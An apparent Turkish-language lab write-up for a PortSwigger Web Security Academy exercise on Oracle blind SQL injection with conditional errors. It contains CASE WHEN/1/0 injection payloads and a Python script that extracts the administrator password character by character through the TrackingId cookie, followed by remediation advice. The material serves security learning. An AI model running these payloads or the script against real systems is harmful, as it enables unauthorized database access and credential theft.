# SQLi Lab #9: Blind SQLi — conditional errors (Oracle, +Python) — 30.10.2026

> İkinci blind türü. Aynı omurga (evet/hayır oracle → karakter karakter çıkarma), ama bu sefer sinyal içerik değil: koşula bağlı DB hatası (500 vs 200).

**Lab:** PortSwigger → SQL injection → Blind → *Blind SQL injection with conditional errors* (Practitioner, Oracle)
**Görev:** administrator'ın şifresini blind yolla çıkar, giriş yap.

## Önceki blind'dan farkı — sinyal değişti
- Conditional **responses**'ta sinyal = içerik farkı ("Welcome back" var/yok).
- Burada true/false **hiçbir içerik farkı yaratmıyor** (`' AND 1=1--` ve `' AND 1=2--` ikisi de 200). Yani içerik oracle'ı yok.
- Çözüm: koşula bağlı **hata** üret → sinyal **HTTP durum kodu** (500=evet, 200=hayır).
- Omurga aynı: evet/hayır oracle → `LENGTH` + `SUBSTR` ile karakter karakter. Değişen tek şey sinyal.

## Oracle'ı (sinyali) kurma — CASE WHEN + 1/0
Hatayı tek başına üretmek yetmez; **koşula bağlı** olmalı (sadece doğruyken patlasın). Anahtar `CASE WHEN`:
```
' AND (SELECT CASE WHEN (KOŞUL) THEN 1/0 ELSE NULL END FROM dual) IS NULL--
```
- Koşul **doğru** → `1/0` çalışır → **500**.
- Koşul **yanlış** → `NULL` → hata yok → **200**.
- `FROM dual` → Oracle'ın "her select'e tablo" dayatması (dummy tablo).
Kanıt: `1=1` → 500, `1=2` → 200. Oracle hazır.

## Veri çıkarma
- `dual` → `users` geçişi: `dual` boş/sahte tablo, genel test için yeter; ama **şifre `users` tablosunda** → şifreyi sorgulamak için oraya geçersin:
  `... FROM users WHERE username='administrator'`.
- **Uzunluk:** `KOŞUL = LENGTH(password)>N`, 500/200 ile binary search → `>19` 500, `>20` 200 → **20 karakter**.
- **Karakterler:** `KOŞUL = SUBSTR(password,POZ,1)='X'`.
  ⚠️ Oracle fonksiyonu **`SUBSTR`** (PostgreSQL'deki `SUBSTRING` değil — fingerprinting detayı; yanlışı koşulsuz hata = sahte sinyal verir).

## Otomasyon (Python) — dünkü scriptten 2 değişiklik
```python
import requests, time
url  = "https://LAB-ID.web-security-academy.net/"
base = "GEÇERLI_TRACKINGID"
charset = "0123456789abcdefghijklmnopqrstuvwxyz"
password = ""
for pozisyon in range(1, 21):
    for karakter in charset:
        payload = base + f"' AND (SELECT CASE WHEN (SUBSTR(password,{pozisyon},1)='{karakter}') THEN 1/0 ELSE NULL END FROM users WHERE username='administrator') IS NULL--"
        response = requests.get(url, cookies={"TrackingId": payload})
        if response.status_code == 500:          # <-- sinyal: 500 = doğru karakter
            password += karakter
            print(f"{pozisyon}. karakter: {karakter}  ->  {password}")
            break
    time.sleep(0.1)
print(f"\nSifre: {password}")
```
Dünküye göre değişen **iki şey:** (1) payload (CASE WHEN/SUBSTR/1/0), (2) sinyal kontrolü `response.status_code == 500` (içerik değil). `url` değişmesi önemsiz, mantık değil.

## İki blind türünün karşılaştırması (kavramın kalbi)
| | Conditional responses | Conditional errors |
|---|---|---|
| Oracle var mı | Evet | Evet (ikisinde de var!) |
| Sinyal | içerik farkı ("Welcome back") | HTTP durum (500/200) |
| Çıkarma | LENGTH + SUBSTR, karakter karakter | aynı |
Yani fark "oracle var/yok" değil — **oracle hangi sinyali kullanıyor.** (Sıradaki time-based'de sinyal = zaman gecikmesi olacak; omurga yine aynı.)

## 🛡️ Nasıl kapatılır (remediation)
- **Asıl çözüm — parameterized queries:** TrackingId çerez değeri ayrı parametre olarak gitmeli.
- **Generic error handling:** ham DB hatalarının davranışa yansıması (500) bu oracle'ı mümkün kılıyor; tutarlı/generic hata yanıtı sinyali zayıflatır (ama tek başına çözüm değil — asıl düzeltme parameterization).
- Şifreleri hash'le (bcrypt/Argon2); least privilege.

## Zincir bağı
- Blind #1 (responses) → Blind #2 (errors): aynı omurga, farklı sinyal. Desen: sinyal gittikçe sinsileşiyor.
- Sıradaki: **time-based** — ne içerik ne hata farkı olduğunda, sinyal olarak **yanıt süresi** (DB'yi bekletme).
